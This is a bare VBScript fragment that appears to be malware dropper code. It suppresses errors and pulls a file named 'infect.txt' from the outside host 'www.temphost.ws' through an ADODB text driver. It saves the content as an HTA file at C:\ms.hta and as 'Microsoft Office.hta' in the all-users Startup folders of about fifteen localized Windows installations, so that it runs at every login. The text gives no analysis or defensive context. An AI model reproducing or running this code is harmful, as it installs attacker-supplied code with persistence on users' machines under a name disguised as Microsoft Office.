   on error resume next
   Dim Conn, rs
   Set Conn = CreateObject("ADODB.Connection")
   Conn.Open "Driver={Microsoft Text Driver (*.txt; *.csv)};" & _
   "Dbq=www.temphost.ws;" & _
   "Extensions=asc,csv,tab,txt;" & _
   "Persist Security Info=False"
   Dim sql
   sql = "SELECT * from infect.txt"
   set rs = conn.execute(sql)
   set rs =CreateObject("ADODB.recordset")
   rs.Open "SELECT * from infect.txt", conn
   rs.Save "C:\ms.hta", adPersistXML
   rs.Save "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Microsoft Office.hta", adPersistXML
   rs.Save "C:\Documents and Settings\All Users\Menu Inicio\Programas\Inicio\Microsoft Office.hta", adPersistXML
   rs.Save "C:\Documents and Settings\All Users\Menu Démarrer\Programmes\DémarrageMicrosoft Office.hta", adPersistXML
   rs.Save "C:\Documents and Settings\All Users\Menuen Start\Programmer\Start\Microsoft Office.hta", adPersistXML
   rs.Save "C:\Documents and Settings\All Users\Menu Start\Programma's\Opstarten\Microsoft Office.hta", adPersistXML
   rs.Save "C:\Documents and Settings\All Users\Menu Start\Programy\Autostart\Microsoft Office.hta", adPersistXML
   rs.Save "C:\Documents and Settings\All Users\Menu Avvio\Programmi\Esecuzione automatica\Microsoft Office.hta", adPersistXML
   rs.Save "C:\Documents and Settings\All Users\Kaynnista-valikko\Ohjelmat\Kaynnistys\Microsoft Office.hta", adPersistXML
   rs.Save "C:\Documents and Settings\All Users\Start Menu\Programlar\BASLANGIC\Microsoft Office.hta", adPersistXML
   rs.Save "C:\Documents and Settings\All Users\Start-meny\Programmer\Oppstart\Microsoft Office.hta", adPersistXML
   rs.Save "C:\Documents and Settings\All Users\Start-menyn\Program\Autostart\Microsoft Office.hta", adPersistXML
   rs.Save "C:\Documents and Settings\All Users\Menu Iniciar\Programas\Iniciar\Microsoft Office.hta", adPersistXML
   rs.Save "C:\Dokumente und Einstellungen\All Users\Startmenu\Programme\Autostart\Microsoft Office.hta", adPersistXML
   rs.Save "C:\Documents and Settings\All Users\Ãëàâíîå ìåíþ\Ïðîãðàììû\Àâòîçàãðóçêà\Microsoft Office.hta", adPersistXML
   rs.close
   conn.close
